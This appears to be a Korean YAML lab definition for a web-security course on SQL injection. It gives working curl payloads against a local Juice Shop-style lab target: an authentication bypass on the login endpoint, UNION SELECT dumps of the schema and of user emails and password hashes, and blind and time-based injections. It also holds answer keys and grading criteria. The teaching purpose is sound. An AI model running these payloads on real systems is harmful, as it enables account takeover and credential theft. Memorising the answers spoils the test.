lab_id: web-vuln-ai-week02
title: SQL Injection 실습 (AI 지원)
version: ai
course: web-vuln-ai
week: 2
description: SQL Injection 공격의 원리를 이해하고, 다양한 SQLi 기법을 실습하며 방어 방법을 학습합니다. AI SubAgent가
  자동으로 명령을 실행하고 결과를 검증합니다.
difficulty: medium
duration_minutes: 120
objectives:
- SQL Injection의 원리와 유형을 이해한다
- Union, Blind, Error-based SQLi를 실습한다
- SQLi 방어 기법을 이해한다
pass_threshold: 0.6
steps:
- order: 1
  instruction: '대상 웹 애플리케이션(http://{{WEB_IP}})의 검색 기능에서 SQL Injection 가능성을 테스트하시오.


    [도구 권장] **curl 단독 의존 금지**. 카테고리 `sqli_detection` 에 적합한 도구: sqlmap --batch --dbs.
    도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
  hint: 작은따옴표(')를 입력하여 에러를 유발하세요.
  category: sqli_detection
  points: 10
  answer: '🤖 프롬프트: 대상 웹 애플리케이션(http://10.20.30.80)의 검색 기능에서 SQL Injection 가능성을 테스트해줘

    📎 참고 (CLI): curl -s ''http://10.20.30.80/rest/products/search?q=test%27'' 2>/dev/null
    | head -20'
  answer_detail: 작은따옴표 입력 시 SQL 에러가 발생하면 SQLi 취약점이 존재할 가능성이 높습니다.
  verify:
    type: output_contains
    expect: ''
    field: stdout
    semantic:
      intent: SQL Injection 가능성 탐색 — 검색 파라미터에 따옴표·연산자 삽입 후 에러/동작 변화 관찰
      success_criteria:
      - 검색 파라미터에 apostrophe 또는 SQL 메타문자 삽입 시도
      - 정상 요청과 주입 요청의 응답 차이 비교
      - SQLi 판정 근거 (SQL 에러·레코드 수 변화) 제시
      acceptable_methods:
      - curl로 apostrophe 포함 파라미터 전송
      - Burp Repeater 로 요청 변조
      - sqlmap 초기 탐지 --batch
      - python requests 로 자동화
      negative_signs:
      - 메타문자 없이 정상 요청만
      - 응답 비교 없음
      - 판정 근거 없음
  target_vm: attacker
  script: curl -s 'http://10.20.30.80/rest/products/search?q=test%27' 2>/dev/null
    | head -20
  risk_level: low
  bastion_prompt: '대상 웹 애플리케이션(http://10.20.30.80)의 검색 기능에서 SQL Injection 가능성을 테스트해줘


    [도구 권장] sqli_detection: sqlmap --batch --dbs. curl 만 쓰지 말고 **sqlmap --batch --dbs**
    등 적합 도구로 호출 후 stdout quote.'
- order: 2
  instruction: '에러 기반 SQL Injection을 시도하여 데이터베이스 종류를 파악하시오.


    [도구 권장] **curl 단독 의존 금지**. 카테고리 `sqli_error` 에 적합한 도구: sqlmap --batch --technique=E,
    curl + grep error. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
  hint: 에러 메시지에서 DB 엔진 정보를 확인하세요.
  category: sqli_error
  points: 12
  answer: '🤖 프롬프트: 에러 기반 SQL Injection을 시도하여 데이터베이스 종류를 파악해줘

    📎 참고 (CLI): curl -s ''http://10.20.30.80/rest/products/search?q=test%27%20OR%201=1--''
    2>/dev/null | head -30'
  answer_detail: 에러 메시지에서 SQLite, MySQL, PostgreSQL 등 DB 종류를 식별할 수 있습니다.
  verify:
    type: output_contains
    expect: ''
    field: stdout
    semantic:
      intent: 에러 기반 SQL Injection — SQL 에러 메시지에서 DB 종류(MySQL/PostgreSQL/MSSQL/Oracle)
        식별
      success_criteria:
      - 잘못된 SQL 을 유발해 에러 메시지 캡처
      - 에러 텍스트에서 DB 엔진명 식별 (MySQL, PostgreSQL, SQLite 등)
      - DB 종류별 취약점 차이 언급
      acceptable_methods:
      - curl 로 유효하지 않은 SQL 조각 주입
      - sqlmap --fingerprint
      - 에러 코드 테이블 조회 (ER_*, ORA-*)
      - Burp Intruder 로 여러 페이로드 테스트
      negative_signs:
      - 에러 유발 없이 개념 설명만
      - DB 종류 식별 시도 없음
      - 블라인드로 바로 진행
  target_vm: attacker
  script: curl -s 'http://10.20.30.80/rest/products/search?q=test%27%20OR%201=1--'
    2>/dev/null | head -30
  risk_level: low
  bastion_prompt: '에러 기반 SQL Injection을 시도하여 데이터베이스 종류를 파악해줘


    [도구 권장] sqli_error: sqlmap --batch --technique=E, curl + grep error. curl 만 쓰지
    말고 **sqlmap --batch --technique=E** 등 적합 도구로 호출 후 stdout quote.'
- order: 3
  instruction: '항상 참인 조건(1=1)을 이용하여 인증 우회를 시도하시오.


    [도구 권장] **curl 단독 의존 금지**. 카테고리 `sqli_auth_bypass` 에 적합한 도구: sqlmap --batch --forms
    또는 curl 인증 우회 PoC. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
  hint: 로그인 폼에 ' OR 1=1-- 페이로드를 사용하세요.
  category: sqli_auth_bypass
  points: 12
  answer: "\U0001F916 프롬프트: 항상 참인 조건(1=1)을 이용하여 인증 우회를 시도해줘\n\U0001F4CE 참고 (CLI):\
    \ curl -s -X POST http://10.20.30.80/rest/user/login \\\n  -H 'Content-Type: application/json'\
    \ \\\n  -d '{\"email\":\"admin@juice-sh.op'\\''--\",\"password\":\"anything\"\
    }' 2>/dev/null \\\n | head -10"
  answer_detail: ''' OR 1=1-- 페이로드는 WHERE 절을 항상 참으로 만들어 인증을 우회합니다.'
  verify:
    type: output_contains
    expect: ''
    field: stdout
    semantic:
      intent: 인증 우회 SQL Injection — 로그인 필드에 항상 참 조건(OR 1=1) 주입 후 관리자 세션 획득
      success_criteria:
      - username 또는 password 필드에 메타문자 + OR 1=1 같은 tautology 주입
      - 로그인 성공 응답(리다이렉트, 세션 쿠키) 확인
      - Prepared Statement 로 방어 가능함 언급
      acceptable_methods:
      - curl -d username=admin 또는 1=1-- 형태
      - Burp Repeater
      - sqlmap --auth-type POST --data
      - python requests 로 POST 자동화
      negative_signs:
      - 주입 시도 없이 일반 로그인만
      - 성공 여부 검증 없음
      - 방어 기법 누락
  target_vm: attacker
  script: "curl -s -X POST http://10.20.30.80/rest/user/login \\\n  -H 'Content-Type:\
    \ application/json' \\\n  -d '{\"email\":\"admin@juice-sh.op'\\''--\",\"password\"\
    :\"anything\"}' 2>/dev/null \\\n | head -10"
  risk_level: low
  bastion_prompt: '항상 참인 조건(1=1)을 이용하여 인증 우회를 시도해줘


    [도구 권장] sqli_auth_bypass: sqlmap --batch --forms 또는 curl 인증 우회 PoC. curl 만 쓰지
    말고 **sqlmap --batch --forms 또는 curl 인증 우회 PoC** 등 적합 도구로 호출 후 stdout quote.'
- order: 4
  instruction: 'UNION SELECT를 이용하여 데이터베이스의 테이블 목록을 추출하시오.


    [도구 권장] **curl 단독 의존 금지**. 카테고리 `sqli_union` 에 적합한 도구: sqlmap --batch --technique=U
    --dump. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
  hint: ORDER BY로 컬럼 수를 먼저 파악하세요.
  category: sqli_union
  points: 15
  answer: '🤖 프롬프트: UNION SELECT를 이용하여 데이터베이스의 테이블 목록을 추출해줘

    📎 참고 (CLI): curl -s ''http://10.20.30.80/rest/products/search?q=test%27%20UNION%20SELECT%20sql,2,3,4,5,6,7,8,9%20FROM%20sqlite_master--''
    2>/dev/null | head -40'
  answer_detail: UNION SELECT로 다른 테이블의 데이터를 기존 쿼리 결과에 합쳐 추출합니다. sqlite_master는 SQLite의
    메타데이터 테이블입니다.
  verify:
    type: output_contains
    expect: ''
    field: stdout
    semantic:
      intent: UNION SELECT — 컬럼 수 일치 탐색 후 information_schema.tables 조회로 테이블 목록 추출
      success_criteria:
      - 컬럼 수 매칭 (ORDER BY N 으로 탐색 또는 UNION SELECT NULL*N) 과정 설명
      - information_schema.tables 또는 sys.tables 대상 UNION 쿼리
      - 테이블명 최소 1개 이상 추출 가능함 확인
      acceptable_methods:
      - <SENSITIVE:b1cc3d9139e4a8ad>
      - sqlmap --dbs --tables
      - 수동 컬럼 수 확인 (NULL 추가/ORDER BY)
      - Burp Intruder 페이로드 리스트
      negative_signs:
      - 컬럼 수 확인 없이 UNION 시도
      - information_schema 접근 설명 없음
      - 테이블 추출 결과 없음
  target_vm: attacker
  script: curl -s 'http://10.20.30.80/rest/products/search?q=test%27%20UNION%20SELECT%20sql,2,3,4,5,6,7,8,9%20FROM%20sqlite_master--'
    2>/dev/null | head -40
  risk_level: low
  bastion_prompt: 'UNION SELECT를 이용하여 데이터베이스의 테이블 목록을 추출해줘


    [도구 권장] sqli_union: sqlmap --batch --technique=U --dump. curl 만 쓰지 말고 **sqlmap
    --batch --technique=U --dump** 등 적합 도구로 호출 후 stdout quote.'
- order: 5
  instruction: 'UNION SELECT로 사용자 테이블의 이메일과 패스워드 해시를 추출하시오.


    [도구 권장] **curl 단독 의존 금지**. 카테고리 `sqli_union` 에 적합한 도구: sqlmap --batch --technique=U
    --dump. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
  hint: Users 테이블의 email, password 컬럼을 조회하세요.
  category: sqli_union
  points: 15
  answer: '🤖 프롬프트: UNION SELECT로 사용자 테이블의 이메일과 패스워드 해시를 추출해줘

    📎 참고 (CLI): curl -s ''http://10.20.30.80/rest/products/search?q=test%27%20UNION%20SELECT%20email,password,3,4,5,6,7,8,9%20FROM%20Users--''
    2>/dev/null | head -40'
  answer_detail: 사용자 테이블에서 인증 정보를 탈취할 수 있습니다. 이는 가장 치명적인 SQLi 시나리오입니다.
  verify:
    type: output_contains
    expect: ''
    field: stdout
    semantic:
      intent: <SENSITIVE:591a1ba8f0db86f6>
      success_criteria:
      - UNION 으로 users 테이블의 email·password_hash 컬럼 선택
      - 추출 결과에서 해시 형식(MD5/bcrypt/SHA256) 식별
      - PII 노출 위험·GDPR 관점 언급
      acceptable_methods:
      - <SENSITIVE:33fe22809024867d>
      - sqlmap --dump -T users
      - Burp Repeater 로 쿼리 변조
      - python으로 결과 파싱
      negative_signs:
      - UNION 없이 단순 조회
      - 해시 형식 식별 없음
      - PII 위험 언급 없음
  target_vm: attacker
  script: curl -s 'http://10.20.30.80/rest/products/search?q=test%27%20UNION%20SELECT%20email,password,3,4,5,6,7,8,9%20FROM%20Users--'
    2>/dev/null | head -40
  risk_level: low
  bastion_prompt: 'UNION SELECT로 사용자 테이블의 이메일과 패스워드 해시를 추출해줘


    [도구 권장] sqli_union: sqlmap --batch --technique=U --dump. curl 만 쓰지 말고 **sqlmap
    --batch --technique=U --dump** 등 적합 도구로 호출 후 stdout quote.'
- order: 6
  instruction: 'Blind SQL Injection을 수행하시오: 참/거짓 조건에 따른 응답 차이 분석.


    [도구 권장] **curl 단독 의존 금지**. 카테고리 `sqli_blind` 에 적합한 도구: sqlmap --batch --technique=B,T
    --time-sec=5. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
  hint: AND 1=1과 AND 1=2의 응답을 비교하세요.
  category: sqli_blind
  points: 12
  answer: '🤖 프롬프트: Blind SQL Injection을 수행하시오: 참/거짓 조건에 따른 응답 차이 분석해줘

    📎 참고 (CLI): echo ''참 조건:'' && curl -o /dev/null -s -w ''%{http_code}'' ''http://10.20.30.80/rest/products/search?q=test%27%20AND%201=1--''
    && echo '''' && echo ''거짓 조건:'' && curl -o /dev/null -s -w ''%{http_code}'' ''http://10.20.30.80/rest/products/search?q=test%27%20AND%201=2--''
    && echo '''' && echo ''Blind SQLi 테스트 완료'''
  answer_detail: Blind SQLi에서는 참/거짓 조건에 따른 응답 차이(상태코드, 응답크기, 응답시간)를 분석합니다.
  verify:
    type: output_contains
    expect: Blind SQLi 테스트 완료
    field: stdout
    semantic:
      intent: Blind SQLi (Boolean-based) — 참/거짓 조건의 응답 차이(길이·존재 여부)로 DB 정보 한 비트씩 추출
      success_criteria:
      - 참 조건(1=1)과 거짓 조건(1=2)의 응답 차이(콘텐츠 길이, 상태, 존재) 비교
      - SUBSTR 또는 ASCII 함수로 한 글자씩 추출하는 로직 설명
      - Blind 와 Error-based SQLi 의 차이 언급
      acceptable_methods:
      - curl 로 1=1 vs 1=2 비교 요청
      - sqlmap --technique B
      - Burp Intruder pitchfork 로 자동 비교
      - python requests + diff
      negative_signs:
      - 참/거짓 비교 없이 단일 쿼리만
      - 응답 차이 지표 명시 없음
      - 자동화 없이 대량 추출 시도
  target_vm: attacker
  script: echo '참 조건:' && curl -o /dev/null -s -w '%{http_code}' 'http://10.20.30.80/rest/products/search?q=test%27%20AND%201=1--'
    && echo '' && echo '거짓 조건:' && curl -o /dev/null -s -w '%{http_code}' 'http://10.20.30.80/rest/products/search?q=test%27%20AND%201=2--'
    && echo '' && echo 'Blind SQLi 테스트 완료'
  risk_level: low
  bastion_prompt: 'Blind SQL Injection을 수행하시오: 참/거짓 조건에 따른 응답 차이 분석해줘


    [도구 권장] sqli_blind: sqlmap --batch --technique=B,T --time-sec=5. curl 만 쓰지 말고
    **sqlmap --batch --technique=B** 등 적합 도구로 호출 후 stdout quote.'
- order: 7
  instruction: 'Time-based Blind SQL Injection을 테스트하시오.


    [도구 권장] **curl 단독 의존 금지**. 카테고리 `sqli_blind` 에 적합한 도구: sqlmap --batch --technique=B,T
    --time-sec=5. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
  hint: SLEEP 또는 WAITFOR 함수를 사용하세요.
  category: sqli_blind
  points: 12
  answer: '🤖 프롬프트: Time-based Blind SQL Injection을 테스트해줘

    📎 참고 (CLI): echo ''시간 측정:'' && time curl -s ''http://10.20.30.80/rest/products/search?q=test%27%20AND%20(SELECT%20CASE%20WHEN%201=1%20THEN%20RANDOMBLOB(100000000)%20ELSE%201%20END)--''
    -o /dev/null 2>&1 && echo ''Time-based SQLi 테스트 완료'''
  answer_detail: Time-based SQLi는 응답 지연으로 참/거짓을 판별합니다. 데이터 추출이 느리지만 탐지가 어렵습니다.
  verify:
    type: output_contains
    expect: Time-based SQLi 테스트 완료
    field: stdout
    semantic:
      intent: Time-based Blind SQLi — SLEEP 또는 BENCHMARK 함수로 응답 지연 유도, 지연 측정으로 조건
        참 판정
      success_criteria:
      - SLEEP(N) 또는 pg_sleep 삽입 후 응답 시간 측정
      - time 명령 또는 curl -w time_total 로 지연 확인
      - Boolean-based 불가 시 Time-based 가 대안임 설명
      acceptable_methods:
      - curl -w time_total 과 SLEEP(5) 주입
      - sqlmap --technique T
      - time curl ...
      - python timeit 로 지연 측정
      negative_signs:
      - SLEEP 없이 진행
      - 응답 시간 측정 없음
      - Boolean 과 차이 설명 없음
